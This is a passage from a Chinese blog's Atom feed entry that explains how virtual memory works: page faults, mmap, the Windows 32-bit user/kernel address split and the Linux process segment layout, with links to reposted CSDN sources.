id="再来总结一下虚拟内存是怎么工作的"><a href="#再来总结一下虚拟内存是怎么工作的" class="headerlink" title="再来总结一下虚拟内存是怎么工作的"></a>再来总结一下虚拟内存是怎么工作的</h2><p>当每个进程创建的时候，内核会为进程分配4G的虚拟内存，当进程还没有开始运行时，这只是一个<strong>内存布局</strong>。实际上并不立即就把虚拟内存对应位置的程序数据和代码（比如.text .data段）拷贝到物理内存中，只是建立好虚拟内存和磁盘文件之间的<strong>映射</strong>就好（叫做存储器映射）。这个时候数据和代码<strong>还是在磁盘上</strong>的。当运行到对应的程序时，进程去寻找页表，发现页表中地址没有存放在物理内存上，而是在磁盘上，于是发生<strong>缺页异常</strong>，于是将磁盘上的数据拷贝到物理内存中。</p><p>另外在进程运行过程中，要通过malloc来动态分配内存时，也只是分配了虚拟内存，即为这块虚拟内存对应的页表项做相应设置，当进程真正访问到此数据时，才引发缺页异常。</p><p>可以认为虚拟空间都被映射到了磁盘空间中（事实上也是按需要映射到磁盘空间上，通过mmap，mmap是用来建立虚拟空间和磁盘空间的映射关系的）</p><h2 id="利用虚拟内存机制的优点"><a href="#利用虚拟内存机制的优点" class="headerlink" title="利用虚拟内存机制的优点"></a>利用虚拟内存机制的优点</h2><ul><li>既然每个进程的内存空间都是一致而且固定的（<strong>32位平台下都是4G</strong>），所以链接器在链接可执行文件时，可以设定内存地址，而不用去管这些数据最终实际内存地址，这交给内核来完成映射关系</li><li>当不同的进程使用同一段代码时，比如库文件的代码，在物理内存中可以只存储一份这样的代码，不同进程只要将自己的虚拟内存映射过去就好了，这样可以节省物理内存</li><li>在程序需要分配连续空间的时候，只需要在虚拟内存分配连续空间，而不需要物理内存时连续的，实际上，往往物理内存都是断断续续的内存碎片。这样就可以有效地利用我们的物理内存</li></ul><h2 id="不同系统的虚拟空间"><a href="#不同系统的虚拟空间" class="headerlink" title="不同系统的虚拟空间"></a>不同系统的虚拟空间</h2><h3 id="windows-32下的虚拟地址空间"><a href="#windows-32下的虚拟地址空间" class="headerlink" title="windows 32下的虚拟地址空间"></a>windows 32下的虚拟地址空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/win32%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt></p><p>在 Windows 系统下，虚拟地址空间被分成了 4 部分： <strong>NULL 指针区、用户区、 64KB 禁入区、内核区</strong>。</p><ul><li><strong>用户区</strong>每个进程私有使用的，大约 2GB 左右 ( 最大可以调整到 3GB，3GB模式) ，称为用户地址空间。用户区存放的是<strong>程序代码和数据, 堆, 共享库, 栈</strong>。</li><li><strong>内核区</strong>是所有进程共享的，为 2GB ，称为系统地址空间。内核区保存的是系统线程调度、内存管理、设备驱动等数据，这部分数据供所有的进程共享以及操作系统的使用——程序在运行的时候处于操作系统的监管下，监管进程的虚拟空间，当进程进行非法访问时强制结束程序。（2GB的内核区是所有的进程都是同一个2GB吗）</li><li>上述的2GB+2GB称为2GB模式，是在默认的windows配置下。可以修改windows配置，可以设置3GB用户地址空间+1GB的系统地址空间，称为3GB模式。</li></ul><h3 id="Linux下的4GB虚拟内存空间"><a href="#Linux下的4GB虚拟内存空间" class="headerlink" title="Linux下的4GB虚拟内存空间"></a>Linux下的4GB虚拟内存空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/D:%5Cgitblog%5Csec%5Csource_posts%5C%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB%5Clinux%E5%86%85%E5%AD%98.png" alt></p><blockquote><p>上图由上往下是高地址到低地址；下图由上往下是低地址到高地址；</p></blockquote><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png" alt></p><p>每个段的存放内容如下：</p><ul><li><p><strong>.reserve(预留)段</strong><br>一共占用128M，属于预留空间，进程是禁止访问的</p></li><li><p><strong>.text(代码段)</strong><br>可执行文件加载到内存中的只有数据和指令之分，而指令被存放在.text段中，一般是共享的，编译时确定,只读，不允许修改</p></li><li><p><strong>.data</strong><br>存放在编译阶段(而非运行时)就能确定的数据,可读可写。也就是通常所说的静态存储区,赋了初值的全局变量和赋初值的静态变量存放在这个区域,常量也存放在这个区域</p></li><li><p><strong>.bss段</strong><br>通常用来存放程序中未初始化以及初始化为0的全局/静态变量的一块内存区域，在程序载入时由内核清0</p></li><li><p><strong>.heap(堆)</strong><br>用于存放进程运行时动态分配的内存，可动态扩张或缩减，这块内存由程序员自己管理，通过malloc/new可以申请内存，free/delete用来释放内存，heap的地址从低向高扩展，是不连续的空间</p></li><li><p><strong>.stack(栈)</strong><br>记录函数调用过程相关的维护性信息，栈的地址从高地址向低地址扩展，是连续的内存区域</p></li><li><p><strong>共享库(libc.so)</strong></p></li></ul><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>转载自 ： <a href="https://blog.csdn.net/wyq_5/article/details/77481136" target="_blank" rel="noopener">https://blog.csdn.net/wyq_5/article/details/77481136</a> </p><p>转载自 ： <a href="https://blog.csdn.net/lvyibin890/article/details/82217193" target="_blank" rel="noopener">https://blog.csdn.net/lvyibin890/article/details/82217193</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;a href=&quot;#虚拟内存与物理内存的联系与区别&quot; class=&quot;headerlink&quot; title=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;/a&gt;虚拟内存与物理内存的联系与区别&lt;/h1&gt;&lt;p&gt;重要的概念，需要弄清楚。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
